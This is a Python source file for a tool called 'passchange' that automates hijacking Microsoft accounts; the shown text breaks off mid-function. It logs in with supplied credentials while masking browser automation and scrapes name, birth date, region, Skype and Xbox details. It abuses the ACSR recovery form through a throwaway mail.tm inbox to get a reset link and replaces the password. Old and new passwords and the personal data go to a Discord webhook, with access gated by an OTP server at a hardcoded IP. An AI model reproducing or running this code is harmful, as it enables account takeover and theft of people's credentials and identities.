#!/usr/bin/env python3
"""
Combined single-file `main.py` for passchange
This monolithic file merges:
- existing `main.py` (console flow)
- `run.py` startup helpers
- `tempmail.py`
- all `automation/*.py` modules (except advanced_exe_builder.py)
- all `gui/*.py` modules
- all `utils/*.py` modules

Notes:
- Internal cross-module imports have been removed since everything lives in this file.
- The original `main.py` was backed up to `main.py.bak` before this change.
"""

# Standard / general imports
import sys
import os
import json
import time
import random
import string
import threading
import platform
import traceback
from typing import Tuple
from getpass import getpass
from io import BytesIO
from PIL import Image
import re

# HTTP / requests
import requests

# Selenium & webdriver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# GUI
import tkinter as tk
from tkinter import messagebox, filedialog
import customtkinter as ctk

# third-party
import pycountry

# -----------------------------
# utils: api_client.py
# -----------------------------
class APIClient:
    def __init__(self, base_url: str = "http://212.132.120.102:14307"):
        self.base_url = base_url

    def check_authorization(self, user_id: str) -> Tuple[bool, str]:
        try:
            response = requests.post(
                f"{self.base_url}/check_auth",
                json={"user_id": user_id},
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                if data.get("authorized"):
                    return True, "User is authorized"
                else:
                    return False, "User is not authorized"
            else:
                return False, f"Server error: {response.status_code}"

        except requests.exceptions.ConnectionError:
            return False, "Cannot connect to authentication server. Make sure the Discord bot is running."
        except requests.exceptions.Timeout:
            return False, "Connection timeout. Server is not responding."
        except Exception as e:
            return False, f"Error: {str(e)}"

    def request_otp(self, user_id: str) -> Tuple[bool, str]:
        try:
            response = requests.post(
                f"{self.base_url}/request_otp",
                json={"user_id": user_id},
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                return True, data.get("message", "OTP sent to your Discord DM")
            elif response.status_code == 403:
                return False, "User is not authorized"
            else:
                data = response.json()
                return False, data.get("error", "Failed to request OTP")

        except requests.exceptions.ConnectionError:
            return False, "Cannot connect to authentication server"
        except requests.exceptions.Timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def verify_otp(self, user_id: str, otp: str) -> Tuple[bool, str]:
        try:
            response = requests.post(
                f"{self.base_url}/verify_otp",
                json={"user_id": user_id, "otp": otp},
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                return data.get("success", False), data.get("message", "")
            else:
                data = response.json()
                return False, data.get("error", "Failed to verify OTP")

        except requests.exceptions.ConnectionError:
            return False, "Cannot connect to authentication server"
        except requests.exceptions.Timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def health_check(self) -> bool:
        try:
            response = requests.get(f"{self.base_url}/health", timeout=2)
            return response.status_code == 200
        except:
            return False


# -----------------------------
# Async API client (aiohttp) to be used by async servers/bots
# -----------------------------
try:
    import aiohttp
    import asyncio

    class AsyncAPIClient:
        def __init__(self, base_url: str = "http://212.132.120.102:14307"):
            self.base_url = base_url

        async def _post(self, path: str, payload: dict, timeout: int = 5):
            url = f"{self.base_url}{path}"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, json=payload, timeout=timeout) as resp:
                        data = await resp.json()
                        return resp.status, data
            except Exception as e:
                return None, {"error": str(e)}

        async def check_authorization(self, user_id: str):
            status, data = await self._post("/check_auth", {"user_id": user_id})
            if status == 200:
                return data.get("authorized", False), data.get("message", "")
            return False, data.get("error", "Request failed")

        async def request_otp(self, user_id: str):
            status, data = await self._post("/request_otp", {"user_id": user_id})
            if status == 200:
                return True, data.get("message", "OTP sent")
            elif status == 403:
                return False, "User is not authorized"
            return False, data.get("error", "Failed to request OTP")

        async def verify_otp(self, user_id: str, otp: str):
            status, data = await self._post("/verify_otp", {"user_id": user_id, "otp": otp})
            if status == 200:
                return data.get("success", False), data.get("message", "")
            return False, data.get("error", "Failed to verify OTP")

except Exception:
    # aiohttp not available or import failed; AsyncAPIClient will not be usable
    AsyncAPIClient = None

# -----------------------------
# utils: password_generator.py
# -----------------------------

def generate_shulker_password() -> str:
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(7)])
    return f"FlowCloud{random_numbers}"


def generate_custom_password(prefix: str = "FlowCloud", length: int = 7) -> str:
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(length)])
    return f"{prefix}{random_numbers}"

# -----------------------------
# Discord logging hook (callable set by the bot to forward logs to a log channel)
# The hook should be a callable like: hook(title: str, message: str, image_bytes: bytes | None = None, filename: str | None = None)
# It's safe to be called from background threads (bot will use run_coroutine_threadsafe)
discord_log_hook = None

def set_discord_log_hook(hook):
    """Set a hook callable used to forward runtime logs to Discord (log channel).
    Example usage from bot: core.set_discord_log_hook(lambda t,m,img,fname: asyncio.run_coroutine_threadsafe(post_log_embed(bot, t, m, img, fname), bot.loop))
    """
    global discord_log_hook
    discord_log_hook = hook


def _log_to_discord(title: str, message: str, image_bytes: bytes = None, filename: str = None):
    try:
        if discord_log_hook:
            discord_log_hook(title, message, image_bytes, filename)
    except Exception:
        # Never raise from logging
        pass


def screenshot_and_log(driver, title: str, message: str, filename_prefix: str = "screenshot"):
    """Take screenshot via Selenium driver and forward it to the discord log hook.
    Safe to call from worker threads.
    """
    try:
        png = driver.get_screenshot_as_png()
        _log_to_discord(title, message, png, f"{filename_prefix}.png")
    except Exception:
        # Silently ignore screenshot failures
        pass

# -----------------------------
# utils: session_manager.py
# -----------------------------
SESSION_FILE = "user_session.json"

def save_session(user_id: str):
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump({"user_id": user_id}, f)
        return True
    except Exception as e:
        print(f"Failed to save session: {e}")
        return False


def load_session():
    try:
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                data = json.load(f)
                return data.get("user_id")
        return None
    except Exception as e:
        print(f"Failed to load session: {e}")
        return None


def clear_session():
    try:
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
        return True
    except Exception as e:
        print(f"Failed to clear session: {e}")
        return False


def has_saved_session():
    return os.path.exists(SESSION_FILE)

# -----------------------------
# tempmail.py (merged)
# -----------------------------
BASE_URL = "https://api.mail.tm"

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def get_domains():
    r = requests.get(f"{BASE_URL}/domains")
    return r.json()['hydra:member'][0]['domain']


def register_account(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/accounts", json=payload)
    return r.status_code in [201, 422]


def get_token(email, password):
    payload = {"address": email, "password": password}
    r = requests.post(f"{BASE_URL}/token", json=payload)
    return r.json().get('token')


def get_messages(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages", headers=headers)
    return r.json().get('hydra:member', [])


def read_message(token, message_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/messages/{message_id}", headers=headers)
    return r.json()


def generate_temp_mail_account():
    username = random_name()
    password = random_name(12)
    domain = get_domains()
    email = f"{username}@{domain}"
    register_account(email, password)
    token = get_token(email, password)
    return email, password, token


def wait_for_emails(token, expected_count=2, timeout=90, interval=5):
    attempts = timeout // interval
    for _ in range(attempts):
        inbox = get_messages(token)
        if len(inbox) >= expected_count:
            return inbox[:expected_count]
        time.sleep(interval)
    return get_messages(token)


def extract_otp(text):
    match = re.search(r'\b\d{6}\b', text)
    return match.group(0) if match else None


def get_otp_from_first_email(token):
    emails = wait_for_emails(token, expected_count=1)

    if not emails:
        print("❌ No email received.")
        return None

    msg = read_message(token, emails[0]['id'])
    otp = extract_otp(msg.get('text', ''))

    if otp:
        print("🔐 Extracted OTP:", otp)
    else:
        print("❌ OTP not found in email.")

    return otp


def print_second_email(token, emails):
    if len(emails) < 2:
        print("❌ Less than 2 emails available.")
        return

    msg = read_message(token, emails[1]['id'])
    print("\n📧 Full Email Content (2nd Email):\n")
    print(msg.get('text',''))


def extract_specific_link(text):
    lines = text.splitlines()
    for i, line in enumerate(lines):
        if "Click this link to reset your password:" in line:
            for j in range(i + 1, len(lines)):
                next_line = lines[j].strip()
                if next_line.startswith("http"):
                    return next_line
    return None

# -----------------------------
# automation/driver.py -> create_driver
# -----------------------------

def create_driver(headless=True):
    options = Options()
    if headless:
        options.add_argument("--headless=new")
    else:
        options.add_argument("--start-minimized")

    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--incognito")
    options.add_argument("--disable-webauthn")
    options.add_argument("--disable-features=WebAuthentication,WebAuthn")

    system = platform.system().lower()
    if system == 'linux':
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"

    options.add_argument(f"user-agent={user_agent}")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)

    chrome_paths = [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/opt/google/chrome/chrome",
        "/snap/bin/chromium"
    ]

    for chrome_path in chrome_paths:
        if os.path.exists(chrome_path):
            options.binary_location = chrome_path
            print(f"🔍 Found Chrome at: {chrome_path}")
            break

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
        print("✅ ChromeDriver initialized successfully")
    except Exception as e:
        print(f"❌ ChromeDriver initialization failed: {e}")
        try:
            driver = webdriver.Chrome(options=options)
            print("✅ ChromeDriver initialized with system driver")
        except Exception as e2:
            print(f"❌ System ChromeDriver also failed: {e2}")
            raise e2

    try:
        driver.execute_cdp_cmd(
            'Page.addScriptToEvaluateOnNewDocument',
            {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.navigator.chrome = { runtime: {} };
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            }
        )
    except Exception as e:
        print(f"⚠️  Could not set anti-detection measures: {e}")

    return driver

# -----------------------------
# automation/captcha.py -> download_captcha
# -----------------------------

def download_captcha(driver) -> BytesIO:
    try:
        captcha_img = driver.find_element(By.XPATH, '//img[contains(@src, "GetHIPData")]')
        src = captcha_img.get_attribute("src")
        response = requests.get(src)
        img = Image.open(BytesIO(response.content))
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        print("🧩 CAPTCHA downloaded successfully.")
        return buf
    except Exception as e:
        print(f"❌ Failed to download CAPTCHA:  {e}")
        return None

# -----------------------------
# automation/logger.py -> send_webhook
# -----------------------------

def send_webhook(results: list, webhook_url: str):
    if not results:
        return

    content = "**✅ Password Changed Successfully For These Accounts:**\n"

    for result in results:
        content += (
            f"**Email:** `{result.get('email', 'N/A')}`\n"
            f"**New Pass:** `{result.get('new_password', 'N/A')}`\n"
            f"**Old Pass:** `{result.get('old_password', 'N/A')}`\n"
            f"**Name:** {result.get('name', 'N/A')}\n"
            f"**DOB:** {result.get('dob', 'N/A')}\n"
            f"**Region:** {result.get('region', 'N/A')}\n"
            f"**Skype ID:** `{result.get('skype_id', 'N/A')}`\n"
            f"**Skype Email:** `{result.get('skype_email', 'N/A')}`\n"
            f"**Gamertag:** `{result.get('gamertag', 'N/A')}`\n"
            "----------------------------\n"
        )

    data = {
        "username": "Password Changer",
        "avatar_url": "https://i.imgur.com/AfFp7pu.png",
        "content": content
    }

    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code not in (200, 204):
            print(f"⚠️ Webhook error: {response.status_code} {response.text}")
    except Exception as e:
        print(f"❌ Failed to send webhook: {e}")

# -----------------------------
# automation/core.py -> scrape_account_info
# -----------------------------
all_countries = {country.name for country in pycountry.countries}

def scrape_account_info(email: str, password: str) -> dict:
    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    # Log scrape start
    _log_to_discord("Scrape started", f"Starting scrape for {email}")

    try:
        driver.get("https://login.live.com")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)

        password_input = None

        try:
            password_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
            print("✅ Password input appeared directly.")

        except TimeoutException:
            print("Password input not visible, checking for alternate buttons...")
            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]") )
                )
                use_password_btn.click()
                print("➡️ Clicked 'Use your password'")
                # take screenshot and send to log channel
                screenshot_and_log(driver, "UI: Use password clicked", f"{email}: Clicked 'Use your password'", f"{email}_usepassword")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                try:
                    other_ways_btn = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]") )
                    )
                    other_ways_btn.click()
                    print("➡️ Clicked 'Other ways to sign in'")
                    screenshot_and_log(driver, "UI: Other ways clicked", f"{email}: Clicked 'Other ways to sign in'", f"{email}_otherways")
                    time.sleep(1)
                    use_password_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]") )
                    )
                    use_password_btn.click()
                    print("➡️ Clicked 'Use your password' after 'Other ways'")
                    password_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )
                except TimeoutException:
                    try:
                        switch_link = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.ID, "idA_PWD_SwitchToCredPicker"))
                        )
                        switch_link.click()
                        print("➡️ Clicked 'Sign in another way'")
                        screenshot_and_log(driver, "UI: Sign in another way clicked", f"{email}: Clicked 'Sign in another way'", f"{email}_switchlink")
                        time.sleep(1)
                        use_password_btn = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]") )
                        )
                        use_password_btn.click()
                        print("➡️ Clicked 'Use your password' after legacy switch")
                        password_input = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.NAME, "passwd"))
                        )
                    except TimeoutException:
                        print("❌ Failed to reach password input.")
                        _log_to_discord("Scrape failed", f"{email}: Could not reach password input")
                        return {"email": email, "error": "Could not reach password input"}

        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)

        try:
            password_input = driver.find_element(By.ID, "passwordEntry")
            if password_input.is_displayed():
                print("❌ Password input still present — likely incorrect password.")
                return {"email": email, "error": "Incorrect password"}
        except:
            print("✅ Login successful. No password error detected.")
            screenshot_and_log(driver, "Login success", f"{email}: Login successful", f"{email}_login_success")

        try:
            if "Too Many Requests" in driver.page_source:
                print("⚠️ 'Too Many Requests' detected — retrying shortly...")
                retries = 0
                max_retries = 20
                while "Too Many Requests" in driver.page_source and retries < max_retries:
                    time.sleep(1)
                    driver.refresh()
                    retries += 1
                if "Too Many Requests" in driver.page_source:
                    print("🚫 Still blocked after multiple retries. Skipping account.")
                    return {"email": email, "error": "Too Many Requ" "ests even after retry"}
        except:
            print("✅ No rate limit detected. Proceeding normally.")

        try:
            security_next_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "iLandingViewAction"))
            )
            print("🔒 Security info change screen found. Clicking 'Next'...")
            security_next_btn.click()
            time.sleep(2)
        except:
            print("✅ No security prompt detected. Continuing...")

        try:
            stay_signed_in_yes = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
            )
            print("🔄 'Stay signed in?' prompt detected. Confirming...")
            stay_signed_in_yes.click()
            time.sleep(2)
        except:
            print("❌ Password input still present — likely incorrect password.")
            return {"email": email, "error": "Incorrect password"}

        try:
            close_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Close"]'))
            )
            print("🛡️ Security modal detected. Closing it...")
            close_button.click()
            time.sleep(1)
        except:
            print("✅ No security modal found. Navigating to profile...")

        print("🌐 Opening Microsoft profile page...")
        driver.get("https://account.microsoft.com/profile")
        time.sleep(2)
        driver.get("https://account.microsoft.com/profile")
        try:
            wait.until(EC.presence_of_element_located((By.ID, "profile.profile-page.personal-section.full-name")))
            name = driver.find_element(By.ID, "profile.profile-page.personal-section.full-name").text.strip()
            print(f"🔹Captured name : {name}")
            spans = driver.find_elements(By.CSS_SELECTOR, 'span.fui-Text')
            dob = "DOB not found"
            region = "Region not found"

            for span in spans:
                text = span.text.strip()
                if "/" in text and len(text.split("/")) == 3:
                    # capture a screenshot of the profile view once key info is found
                    screenshot_and_log(driver, "Profile page", f"{email}: Profile page loaded", f"{email}_profile")
                    parts = text.split(";")
                    for part in parts:
                        part = part.strip()
                        if "/" in part and len(part.split("/")) == 3:
                            dob = part
                            print(f"🔹 Cleaned DOB: {dob}")
                            break
                elif text in all_countries:
                    region = text
                    print(f"🔹 Captured region: {region}")
        except Exception as e:
            print("❌ could not get account info")
            _log_to_discord("Scrape failed", f"{email}: Couldn't get account info: {e}")
            return {"email": email, "error": "Couldn't get account info, Make sure account is not blocked"}

        driver.get("https://secure.skype.com/portal/profile")
        print("✅ Loaded Skype profile")
        time.sleep(3)

        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
            print(f"🔹Skype ID: {skype_id}")
        except:
            skype_id = "live:"

        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
            print(f"🔹Skype email: {skype_email}")
        except:
            skype_email = email  # fallback

        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)

        gamertag = "Not found"

        try:
            try:
                sign_in_btn = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
                sign_in_btn.click()
                print(f"🔹Clicked sign_in_btn")
                time.sleep(7)
            except:
                pass

            try:
                account_btn = WebDriverWait(driver, 6).until(
                    EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
                )
                account_btn.click()
                print(f"🔹Clicked account_btn")
                WebDriverWait(driver, 15).until(EC.url_contains("/play/user/"))

            except:
                pass

            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1]
                gamertag = gamertag.replace("%20", " ").replace("%25", "%")
                print(f"🔹gamertag: {gamertag}")
        except:
            gamertag = "Error"

        result = {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag
        }
        _log_to_discord("Scrape succeeded", f"{email}: Scraped account info (name={name}, region={region})")
        return result

    except Exception as e:
        _log_to_discord("Scrape error", f"{email}: Exception during scrape: {e}")
        return {"error": "Could Not Login!"}
    finally:
        driver.quit()

# -----------------------------
# automation/acsr.py -> submit_acsr_form
# -----------------------------

def submit_acsr_form(account_info: dict):
    email = account_info['email']
    name = account_info['name']
    dob = account_info['dob']
    region = account_info['region']
    skype_id = account_info['skype_id']
    skype_email = account_info['skype_email']
    gamertag = account_info['gamertag']

    tempmail, temp_pass, token = generate_temp_mail_account()
    print(f"📩 Generated Temp Mail: {tempmail}")
    _log_to_discord("ACSR tempmail", f"{email}: Generated tempmail {tempmail}")

    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    try:
        driver.get("https://account.live.com/acsr")
        time.sleep(2)

        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        print("✉️ Entered Microsoft email.")

        tempmail_input = wait.until(EC.presence_of_element_located((By.ID, "iCMailInput")))
        tempmail_input.clear()
        tempmail_input.send_keys(tempmail)
        print("📨 Entered tempmail.")
        screenshot_and_log(driver, "ACSR form", f"{email}: Entered tempmail {tempmail}", f"{email}_acsr_templmail")

        captcha_image = download_captcha(driver)
        print("🧩 CAPTCHA ready.")
        screenshot_and_log(driver, "ACSR captcha", f"{email}: CAPTCHA ready; tempmail={tempmail}", f"{email}_acsr_captcha")
        _log_to_discord("ACSR captcha", f"{email}: CAPTCHA ready; tempmail={tempmail}")
        
        return captcha_image, driver, token, tempmail
        
    except Exception as e:
        print(f"❌ ACSR automation error: {e}")
        _log_to_discord("ACSR error", f"{email}: ACSR automation error: {e}")
        driver.quit()
        return None, None, None, None

# -----------------------------
# automation/acsr_continue.py -> continue_acsr_flow
# -----------------------------

def get_month_name(date_str):
    try:
        date_obj = time.strptime(date_str, "%m/%d/%Y")
        from datetime import datetime
        date_obj = datetime.strptime(date_str, "%m/%d/%Y")
        month_name = date_obj.strftime("%B")
        day = str(date_obj.day)
        year = str(date_obj.year)
        return month_name, day, year
    except ValueError:
        return "May", "5", "1989"


def continue_acsr_flow(driver, account_info, token, captcha_text, user_id):
    wait = WebDriverWait(driver, 20)

    try:
        captcha_value = captcha_text

        try:
            captcha_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, '//input[contains(@id, "SolutionElement")]'))
            )
            captcha_input.clear()
            captcha_input.send_keys(captcha_value)
            captcha_input.send_keys(Keys.RETURN)
            print("📨 CAPTCHA submitted. Waiting for OTP input field...")
            _log_to_discord("ACSR captcha submitted", f"{account_info.get('email')}: CAPTCHA submitted by user {user_id}")

            code_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "iOttText"))
            )
            print("✅ CAPTCHA accepted.")
            screenshot_and_log(driver, "ACSR: CAPTCHA accepted", f"{account_info.get('email')}: CAPTCHA accepted", f"{account_info.get('email')}_captcha_ok")

        except Exception:
            print("❌ CAPTCHA failed or OTP input not found.")
            _log_to_discord("ACSR captcha failed", f"{account_info.get('email')}: CAPTCHA failed or OTP input not found")
            print("🔁 Waiting for new CAPTCHA to regenerate...\n")

            try:
                captcha_image = download_captcha(driver)
                print("🧩 New CAPTCHA downloaded.")
                _log_to_discord("ACSR captcha", f"{account_info.get('email')}: New CAPTCHA downloaded")
                with open(f"captcha_retry_{user_id}.png", "wb") as f:
                    f.write(captcha_image.read())

                return "CAPTCHA_RETRY_NEEDED"
            except Exception as e:
                print(f"❌ Failed to detect new CAPTCHA image: {e}")
                _log_to_discord("ACSR error", f"{account_info.get('email')}: Failed to detect new CAPTCHA image: {e}")
                return "CAPTCHA_DOWNLOAD_FAILED"

        print("⌛ Waiting for OTP via tempmail...")
        otp = get_otp_from_first_email(token)
        if not otp:
            print("❌ OTP not received.")
            _log_to_discord("ACSR otp missing", f"{account_info.get('email')}: OTP not received from tempmail")
            return "❌ OTP not received."

        print(f"📥 OTP received: {otp}")
        _log_to_discord("ACSR otp received", f"{account_info.get('email')}: OTP received via tempmail")
        screenshot_and_log(driver, "ACSR: OTP received", f"{account_info.get('email')}: OTP received", f"{account_info.get('email')}_otp")

        code_input = wait.until(EC.presence_of_element_located((By.ID, "iOttText")))
        code_input.clear()
        code_input.send_keys(otp)
        code_input.send_keys(Keys.RETURN)
        print("🔐 OTP submitted.")
        screenshot_and_log(driver, "ACSR: OTP submitted", f"{account_info.get('email')}: OTP submitted", f"{account_info.get('email')}_otp_submitted")
        time.sleep(2)

        print("🧾 Filling name...")
        first, last = account_info['name'].split(maxsplit=1) if ' ' in account_info['name'] else (account_info['name'], "Last")
        wait.until(EC.presence_of_element_located((By.ID, "FirstNameInput"))).send_keys(first)
        wait.until(EC.presence_of_element_located((By.ID, "LastNameInput"))).send_keys(last)

        month, day, year = get_month_name(account_info['dob'])

        if not all([month, day, year]):
            raise ValueError("❌ Invalid or missing DOB, aborting ACSR form.")

        day_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
        )
        Select(day_element).select_by_visible_text(day)

        month_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
        )
        Select(month_element).select_by_visible_text(month)

        year_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_yearInput"))
        )
        Select(year_element).select_by_visible_text(year)
        print(f"Parsed DOB: {month=}, {day=}, {year=}")
        print("✅ Dropdown Options Loaded:", [o.text for o in Select(month_element).options])

        print("📆 DOB filled.")
        screenshot_and_log(driver, "ACSR: DOB filled", f"{account_info.get('email')}: DOB fields filled", f"{account_info.get('email')}_dob")

        wait.until(EC.presence_of_element_located((By.ID, "CountryInput"))).send_keys(account_info['region'])
        print("🌍 Region filled.")
        time.sleep(1)

        first_name_input = driver.find_element(By.ID, "FirstNameInput")
        first_name_input.send_keys(Keys.RETURN)
        time.sleep(1)

        print("🔐 Entering old password...")
        previous_pass_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]'))
        )
        previous_pass_input.clear()
        previous_pass_input.send_keys(account_info["password"])
        print("✅ Old password entered.")
        screenshot_and_log(driver, "ACSR: Old password entered", f"{account_info.get('email')}: Old password entered", f"{account_info.get('email')}_oldpass")
        time.sleep(2)

        skype_checkbox = driver.find_element(By.ID, "ProductOptionSkype")
        if not skype_checkbox.is_selected():
            skype_checkbox.click()
            print("☑️ Skype option selected.")
            screenshot_and_log(driver, "ACSR: Skype selected", f"{account_info.get('email')}: Skype option selected", f"{account_info.get('email')}_skype")

        xbox_checkbox = driver.find_element(By.ID, "ProductOptionXbox")
        if not xbox_checkbox.is_selected():
            xbox_checkbox.click()
            print("🎮 Xbox option selected.")
            screenshot_and_log(driver, "ACSR: Xbox selected", f"{account_info.get('email')}: Xbox option selected", f"{account_info.get('email')}_xbox")

        previous_pass_input.send_keys(Keys.RETURN)
        skype_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeNameInput"))
        )
        skype_name_input.clear()
        skype_name_input.send_keys(account_info["skype_id"])

        skype_email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "SkypeAccountCreateEmailInput"))
        )
        skype_email_input.clear()
        skype_email_input.send_keys(account_info["skype_email"])
        print("🔑 Skype info filled.")
        time.sleep(2)
        skype_email_input.send_keys(Keys.RETURN)

        print("🎮 Selecting Xbox One...")
        xbox_radio = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "XboxOneOption"))
        )
        if not xbox_radio.is_selected():
            xbox_radio.click()
        xbox_radio.send_keys(Keys.ENTER)
        print("✅ Xbox One selected.")
        time.sleep(2)

        print("🎮 Entering Xbox Gamertag...")
        xbox_name_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "XboxGamertagInput"))
        )
        xbox_name_input.clear()
        xbox_name_input.send_keys(account_info["gamertag"])
        xbox_name_input.send_keys(Keys.RETURN)
        print("✅ Gamertag submitted.")

        try:
            print("📬 Fetching password reset link from temp mail...")
            time.sleep(90)

            emails = wait_for_emails(token, expected_count=2)
            email2 = read_message(token, emails[0]['id'])
            resetlink = extract_specific_link(email2['text'])

            try:
                driver.quit()
            except Exception:
                pass

            if resetlink:
                print(f"🔗 Target Link: {resetlink}")
                _log_to_discord("Reset link found", f"{account_info.get('email')}: Reset link found: {resetlink}")
                return resetlink
            else:
                print("❌ Target reset link not found.")
                _log_to_discord("Reset link not found", f"{account_info.get('email')}: Reset link not found in tempmail")
                return None
        except Exception as e:
            print(f"❌ Failed to fetch or extract reset link: {e}")
            return None

    except Exception as e:
        print(f"❌ Error while continuing ACSR flow: {e}")
        return None

# -----------------------------
# automation/reset_password.py -> perform_password_reset
# -----------------------------

def perform_password_reset(resetlink, email, new_password):
    print("🔁 Starting password reset flow...")
    _log_to_discord("Password reset started", f"{email}: Starting reset flow with link {resetlink}")

    driver = create_driver()
    wait = WebDriverWait(driver, 25)
    try:
        driver.get(resetlink)
        print("🔗 Opened reset link.")
        _log_to_discord("Reset link opened", f"{email}: Opened reset link")
        screenshot_and_log(driver, "Reset page opened", f"{email}: Reset page opened", f"{email}_resetpage")

        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        print("📨 Email entered.")

        new_pass = wait.until(EC.presence_of_element_located((By.ID, "iPassword")))
        new_pass.clear()
        new_pass.send_keys(new_password)
        new_pass_re = wait.until(EC.presence_of_element_located((By.ID, "iRetypePassword")))
        new_pass_re.clear()
        new_pass_re.send_keys(new_password)
        print("🔑 New password filled.")
        screenshot_and_log(driver, "Reset: New password entered", f"{email}: New password entered (will be submitted)", f"{email}_newpass")
        time.sleep(1)
        new_pass_re.send_keys(Keys.RETURN)

        print("⏳ Waiting for confirmation...")

        time.sleep(5)

        try:
            driver.find_element(By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]')
            fallback_pass = "SladePass!12"
            print(f"⚠️ Password was rejected — retrying with fallback password. : {fallback_pass}")
            _log_to_discord("Password fallback used", f"{email}: Password was rejected; using fallback {fallback_pass}")

            pass_input = driver.find_element(By.ID, "iPassword")
            pass_input.clear()
            pass_input.send_keys(fallback_pass)

            retype_input = driver.find_element(By.ID, "iRetypePassword")
            retype_input.clear()
            retype_input.send_keys(fallback_pass)
            retype_input.send_keys(Keys.RETURN)

            return fallback_pass

        except:
            print("✅ Password accepted. No retry required.")
